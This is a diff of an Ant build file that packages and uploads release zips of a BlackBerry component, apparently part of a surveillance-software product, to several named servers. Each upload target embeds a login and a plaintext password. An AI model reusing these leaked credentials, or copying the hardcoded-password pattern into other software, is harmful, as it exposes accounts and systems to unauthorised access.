@@ -550,7 +550,15 @@
 		<copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\blackberry.zip" overwrite="true" />
 	</target>
 	
-	<target name="zenotto">
+	<target name="update-demo">
+		<updaterelease server="rcs-demo.hackingteam.it" login="zeno" password="zenop123" file=".\server\blackberry_${version}.zip" />
+	</target>
+	
+	<target name="update-castore">
+		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file=".\server\blackberry_${version}.zip" />
+	</target>
+	
+	<target name="update-zenotto">
 		<updaterelease server="zenotto" login="zeno" password="zenop123" file=".\server\blackberry_${version}.zip" />
 	</target>
 
@@ -637,7 +645,7 @@
 		</tstamp>
 		<property file="build.number" />
 
-		<input message="Release (8.1)?" addproperty="do.release" defaultvalue="8.1" />
+		<input message="Release (8.2)?" addproperty="do.release" defaultvalue="8.2" />
 		<var name="destdir" value="../dist/${do.release}/${build.number}.${timestamp.BUILD}" />
 		<echo>${destdir}</echo>
 
@@ -652,7 +660,7 @@
 			</sequential>
 		</for>
     
-    <for list="${historic.versions}" param="version">
+		<for list="${historic.versions}" param="version">
 			<sequential>
 				<mkdir dir="${destdir}/@{version}" />
 				<copy file="historicOutput/@{version}/${dist.lib}" toDir="${destdir}/@{version}" overwrite="true" />
@@ -673,7 +681,7 @@
 			</fileset>
 		</checksum>
 
-		<antcall target="update" />
+		<!-- <antcall target="update" /> -->
 
 	</target>
 
